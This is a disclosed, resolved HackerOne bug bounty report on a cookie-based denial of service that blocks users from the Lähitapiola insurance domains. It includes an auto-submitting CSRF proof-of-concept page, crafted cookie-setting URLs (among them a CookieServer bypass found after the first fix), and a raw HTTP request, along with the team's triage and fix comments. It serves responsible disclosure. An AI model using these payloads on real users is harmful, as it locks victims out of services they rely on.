{"id":129001,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjkwMDE=","url":"https://hackerone.com/reports/129001","title":"Cookie-based client-side denial-of-service to all of the Lähitapiola domains","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-07T13:21:42.998Z","submitted_at":"2016-04-07T13:21:42.998Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"putsi","url":"/putsi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiola’s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-08-30T19:13:39.074Z","bug_reporter_agreed_on_going_public_at":"2016-08-30T19:13:38.934Z","team_member_agreed_on_going_public_at":"2016-08-30T18:34:23.758Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Cookie-based client-side denial-of-service to all of the Lähitapiola domains\n\nTime of detection: 23.2.2016 03:00-04:00\n\nAffected URL: https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus\u0026cookieName=selectedArea\u0026cookieValue=1\u0026backurl=http://www.lahitapiola.fi\n\n## Description:\nAfter the victim opens the affected URL (by direct URL or via CSRF), the victim cannot access any of the Tapiola-domains (see the list below).\nThe vulnerability affects anonymous AND authenticated users.\nThis full client-side denial-of-service will last until the \"selectedArea\"-cookie expires which is about 10 years from the last login. Customer can recover from the condition by deleting the \"selectedArea\"-cookie.\n\n## List of domains which cannot be used by the client:\n- www.tapiola.fi\n- www.lahitapiola.fi\n- verkkopalvelu.tapiola.fi\n- yrityspalvelu.tapiola.fi\n\n## Steps to reproduce:\n1. Navigate either directly or via CSRF-attack to following URL:\n - https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus\u0026cookieName=selectedArea\u0026cookieValue=1\u0026backurl=http://www.lahitapiola.fi\n2. Try to open www.tapiola.fi and notice that a white screen is returned.\n3. Try to open www.lahitapiola.fi and notice that a white screen is returned.\n4. Try to open verkkopalvelu.tapiola.fi and notice that a white screen is returned.\n5. Try to open yrityspalvelu.tapiola.fi and notice that a white screen is returned.\n6. Delete browser cookies and notice that you can now browse the Lähitapiola-website normally.\n\n## CSRF proof-of-concept:\n\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://www.lahitapiola.fi/cs/Satellite\"\u003e\n      \u003cinput type=\"hidden\" name=\"pagename\" value=\"LahiTapiola\u0026#47;LTStatus\" /\u003e\n      \u003cinput type=\"hidden\" name=\"cookieName\" value=\"selectedArea\" /\u003e\n      \u003cinput type=\"hidden\" name=\"cookieValue\" value=\"1\" /\u003e\n      \u003cinput type=\"hidden\" name=\"backurl\" value=\"http\u0026#58;\u0026#47;\u0026#47;www\u0026#46;lahitapiola\u0026#46;fi\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n    \u003cscript\u003e\n      document.forms[0].submit();\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n","vulnerability_information_html":"\u003ch1 id=\"cookie-based-client-side-denial-of-service-to-all-of-the-l-hitapiola-domains\"\u003eCookie-based client-side denial-of-service to all of the Lähitapiola domains\u003c/h1\u003e\n\n\u003cp\u003eTime of detection: 23.2.2016 03:00-04:00\u003c/p\u003e\n\n\u003cp\u003eAffected URL: \u003ca title=\"https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus\u0026amp;cookieName=selectedArea\u0026amp;cookieValue=1\u0026amp;backurl=http://www.lahitapiola.fi\" href=\"/redirect?url=https%3A%2F%2Fwww.lahitapiola.fi%2Fcs%2FSatellite%3Fpagename%3DLahiTapiola%2FLTStatus%26cookieName%3DselectedArea%26cookieValue%3D1%26backurl%3Dhttp%3A%2F%2Fwww.lahitapiola.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus\u0026amp;cookieName=selectedArea\u0026amp;cookieValue=1\u0026amp;backurl=http://www.lahitapiola.fi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription:\u003c/h2\u003e\n\n\u003cp\u003eAfter the victim opens the affected URL (by direct URL or via CSRF), the victim cannot access any of the Tapiola-domains (see the list below).\u003cbr\u003e\nThe vulnerability affects anonymous AND authenticated users.\u003cbr\u003e\nThis full client-side denial-of-service will last until the \u0026quot;selectedArea\u0026quot;-cookie expires which is about 10 years from the last login. Customer can recover from the condition by deleting the \u0026quot;selectedArea\u0026quot;-cookie.\u003c/p\u003e\n\n\u003ch2 id=\"list-of-domains-which-cannot-be-used-by-the-client\"\u003eList of domains which cannot be used by the client:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.tapiola.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.tapiola.fi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.lahitapiola.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.lahitapiola.fi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003everkkopalvelu.tapiola.fi\u003c/li\u003e\n\u003cli\u003eyrityspalvelu.tapiola.fi\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eNavigate either directly or via CSRF-attack to following URL:\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus\u0026amp;cookieName=selectedArea\u0026amp;cookieValue=1\u0026amp;backurl=http://www.lahitapiola.fi\" href=\"/redirect?url=https%3A%2F%2Fwww.lahitapiola.fi%2Fcs%2FSatellite%3Fpagename%3DLahiTapiola%2FLTStatus%26cookieName%3DselectedArea%26cookieValue%3D1%26backurl%3Dhttp%3A%2F%2Fwww.lahitapiola.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus\u0026amp;cookieName=selectedArea\u0026amp;cookieValue=1\u0026amp;backurl=http://www.lahitapiola.fi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eTry to open \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.tapiola.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.tapiola.fi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and notice that a white screen is returned.\u003c/li\u003e\n\u003cli\u003eTry to open \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.lahitapiola.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.lahitapiola.fi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and notice that a white screen is returned.\u003c/li\u003e\n\u003cli\u003eTry to open verkkopalvelu.tapiola.fi and notice that a white screen is returned.\u003c/li\u003e\n\u003cli\u003eTry to open yrityspalvelu.tapiola.fi and notice that a white screen is returned.\u003c/li\u003e\n\u003cli\u003eDelete browser cookies and notice that you can now browse the Lähitapiola-website normally.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"csrf-proof-of-concept\"\u003eCSRF proof-of-concept:\u003c/h2\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n  \u0026lt;body\u0026gt;\u003cbr\u003e\n    \u0026lt;form action=\u0026quot;https://www.lahitapiola.fi/cs/Satellite\u0026quot;\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;pagename\u0026quot; value=\u0026quot;LahiTapiola\u0026amp;#47;LTStatus\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;cookieName\u0026quot; value=\u0026quot;selectedArea\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;cookieValue\u0026quot; value=\u0026quot;1\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;backurl\u0026quot; value=\u0026quot;http\u0026amp;#58;\u0026amp;#47;\u0026amp;#47;www\u0026amp;#46;lahitapiola\u0026amp;#46;fi\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\u003cbr\u003e\n    \u0026lt;/form\u0026gt;\u003cbr\u003e\n    \u0026lt;script\u0026gt;\u003cbr\u003e\n      document.forms[0].submit();\u003cbr\u003e\n    \u0026lt;/script\u0026gt;\u003cbr\u003e\n  \u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-29T18:34:23.891Z","allow_singular_disclosure_after":-134041783.97053565,"singular_disclosure_allowed":true,"vote_count":13,"voters":["putsi","woltage","yaworsk","zombiehelp54","muhammad_uwais","eveeez","l1nkworld","ymy","dineshvicky","its_afolic","and 3 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":897383,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Marking as triaged as we are already working on / looking at solutions.","markdown_message":"\u003cp\u003eMarking as triaged as we are already working on / looking at solutions.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-09T12:54:53.777Z","updated_at":"2016-04-09T12:55:56.923Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":953013,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @putsi , a brief status update. This issue now has a fix pending taking it into production. I will keep you updated.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/putsi\"\u003e@putsi\u003c/a\u003e , a brief status update. This issue now has a fix pending taking it into production. I will keep you updated.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-12T12:13:27.228Z","updated_at":"2016-05-12T12:13:27.228Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":994460,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello. This issue is now fixed. I would appreciate it if you could retest your finding and let me know that you agree on the fix. Thank you.","markdown_message":"\u003cp\u003eHello. This issue is now fixed. I would appreciate it if you could retest your finding and let me know that you agree on the fix. Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T07:37:25.671Z","updated_at":"2016-06-01T07:37:25.671Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":995107,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nI can still exploit this. \nThe fix removed possibility to set the cookie value by using the URL of the original report. However the actual underlying bug still exists (DoS due to selectedArea=1) and can be exploited by using a different page.\n\n**Proof-Of-Concept which uses the CookieServer-functionality to exploit the underlying bug:**\n\n1. Navigate to following URL: https://www.lahitapiola.fi/cs/CookieServer?name=selectedArea\u0026secure=false\u0026timeout=315360000\u0026url=/\u0026value=1\n2. Navigate to any of the following URLs and notice that the white screen is returned:\n   * www.tapiola.fi\n   * www.lahitapiola.fi\n   * verkkopalvelu.tapiola.fi\n   * yrityspalvelu.tapiola.fi\n\nYet again, as there is no CSRF-token present on the vulnerable URL, this attack can be exploited also as a CSRF-attack.","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nI can still exploit this. \u003cbr\u003e\nThe fix removed possibility to set the cookie value by using the URL of the original report. However the actual underlying bug still exists (DoS due to selectedArea=1) and can be exploited by using a different page.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eProof-Of-Concept which uses the CookieServer-functionality to exploit the underlying bug:\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eNavigate to following URL: \u003ca title=\"https://www.lahitapiola.fi/cs/CookieServer?name=selectedArea\u0026amp;secure=false\u0026amp;timeout=315360000\u0026amp;url=/\u0026amp;value=1\" href=\"/redirect?url=https%3A%2F%2Fwww.lahitapiola.fi%2Fcs%2FCookieServer%3Fname%3DselectedArea%26secure%3Dfalse%26timeout%3D315360000%26url%3D%2F%26value%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.lahitapiola.fi/cs/CookieServer?name=selectedArea\u0026amp;secure=false\u0026amp;timeout=315360000\u0026amp;url=/\u0026amp;value=1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eNavigate to any of the following URLs and notice that the white screen is returned:\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.tapiola.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.tapiola.fi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.lahitapiola.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.lahitapiola.fi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003everkkopalvelu.tapiola.fi\u003c/li\u003e\n\u003cli\u003eyrityspalvelu.tapiola.fi\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eYet again, as there is no CSRF-token present on the vulnerable URL, this attack can be exploited also as a CSRF-attack.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T16:39:45.270Z","updated_at":"2016-06-01T16:52:36.705Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":995133,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"By the way, you probably should disable the CookieServer-page if it is not used for anything as an attacker can use it to create and modify cookies of victim's device via CSRF and via direct URL.","markdown_message":"\u003cp\u003eBy the way, you probably should disable the CookieServer-page if it is not used for anything as an attacker can use it to create and modify cookies of victim\u0026#39;s device via CSRF and via direct URL.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T17:05:33.749Z","updated_at":"2016-06-01T17:07:20.199Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":995517,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you again, I will send this back to the team for further investigation.","markdown_message":"\u003cp\u003eThank you again, I will send this back to the team for further investigation.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T20:00:45.647Z","updated_at":"2016-06-01T20:00:45.647Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":996810,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Quick question - can you reproduce this WITHOUT using the CookeServlet -feature also?","markdown_message":"\u003cp\u003eQuick question - can you reproduce this WITHOUT using the CookeServlet -feature also?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-02T15:32:16.839Z","updated_at":"2016-06-02T15:32:16.839Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":996824,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well the DoS-effect can be reproduced by creating the cookie manually (see the following comment). However the actual real-world exploitation requires help from another functionality (e.g. the CookieServer or the recently fixed Satellite-page) which will create/modify the cookie for the customer.","markdown_message":"\u003cp\u003eWell the DoS-effect can be reproduced by creating the cookie manually (see the following comment). However the actual real-world exploitation requires help from another functionality (e.g. the CookieServer or the recently fixed Satellite-page) which will create/modify the cookie for the customer.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-02T15:41:18.792Z","updated_at":"2016-06-02T15:56:10.080Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":996845,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"HTTP-request that can be used to reproduce the white screen:\n```\nGET /henkilo HTTP/1.1\nHost: www.lahitapiola.fi\nCookie: selectedArea=1\nConnection: close\n\n```","markdown_message":"\u003cp\u003eHTTP-request that can be used to reproduce the white screen:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /henkilo HTTP/1.1\nHost: www.lahitapiola.fi\nCookie: selectedArea=1\nConnection: close\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2016-06-02T15:51:07.711Z","updated_at":"2016-06-02T15:52:38.892Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1064128,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, \nI yet again retested this and would like to note that the CookieServer-functionality has now been disabled/removed so the vulnerability cannot be exploited through that anymore. \nHowever manually setting the selectedArea-cookie to value 1 still produces the white screen DoS-effect.","markdown_message":"\u003cp\u003eHi, \u003cbr\u003e\nI yet again retested this and would like to note that the CookieServer-functionality has now been disabled/removed so the vulnerability cannot be exploited through that anymore. \u003cbr\u003e\nHowever manually setting the selectedArea-cookie to value 1 still produces the white screen DoS-effect.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-11T23:34:00.348Z","updated_at":"2016-07-11T23:34:00.348Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1162784,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-30T17:28:44.749Z","updated_at":"2016-08-30T17:28:44.749Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"400.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"putsi","url":"/putsi"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1162979,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-30T18:27:50.260Z","updated_at":"2016-08-30T18:27:50.260Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"putsi","url":"/putsi"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1162994,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Requesting full disclosure.","markdown_message":"\u003cp\u003eRequesting full disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-30T18:34:23.814Z","updated_at":"2016-08-30T18:34:23.814Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1163115,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-30T19:13:38.984Z","updated_at":"2016-08-30T19:13:38.984Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1163116,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-30T19:13:39.112Z","updated_at":"2016-08-30T19:13:39.112Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":2484,"category":"team","content":"##Issue\n\nThe reporter was able to craft a CSRF (and direct URL) that triggered a single user denial of service by modifying a cookie. The affected user had to manually delete the selectedArea -cookie to resolve the situation.  The report contained a thorough PoC which assisted the triaging process.\n\n##Fix\n\nThe issue was investigated and found to be valid. The flaw was simple as such but proved to be multifaceted and the fix required a few iterations to cover all aspects. \n\n##Reasoning\n\nThe reported case was valid and within the scope of the bug bounty program. The issue was fixed and the reporter was awarded with a bounty. \n","can_view?":true,"can_edit?":false,"content_html":"\u003ch2 id=\"issue\"\u003eIssue\u003c/h2\u003e\n\n\u003cp\u003eThe reporter was able to craft a CSRF (and direct URL) that triggered a single user denial of service by modifying a cookie. The affected user had to manually delete the selectedArea -cookie to resolve the situation.  The report contained a thorough PoC which assisted the triaging process.\u003c/p\u003e\n\n\u003ch2 id=\"fix\"\u003eFix\u003c/h2\u003e\n\n\u003cp\u003eThe issue was investigated and found to be valid. The flaw was simple as such but proved to be multifaceted and the fix required a few iterations to cover all aspects. \u003c/p\u003e\n\n\u003ch2 id=\"reasoning\"\u003eReasoning\u003c/h2\u003e\n\n\u003cp\u003eThe reported case was valid and within the scope of the bug bounty program. The issue was fixed and the reporter was awarded with a bounty. \u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}